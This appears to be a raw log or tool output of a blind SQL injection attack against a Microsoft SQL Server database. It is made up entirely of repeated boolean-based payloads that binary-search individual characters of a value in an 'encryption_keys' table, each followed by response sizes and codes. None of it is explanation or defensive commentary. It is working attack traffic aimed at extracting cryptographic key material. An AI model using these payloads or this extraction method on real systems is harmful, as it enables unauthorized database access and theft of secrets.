+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>56	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>87	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>107	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>97	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>92	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>94	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>95	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>98	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>99	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>48	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>72	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>60	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>56	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>54	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>53	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>54	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>53	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>52	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>49	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>50	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>51	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>52	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>49	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>50	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>51	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>87	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>107	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>97	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>102	410
+	138
+use [master]	86
+	165
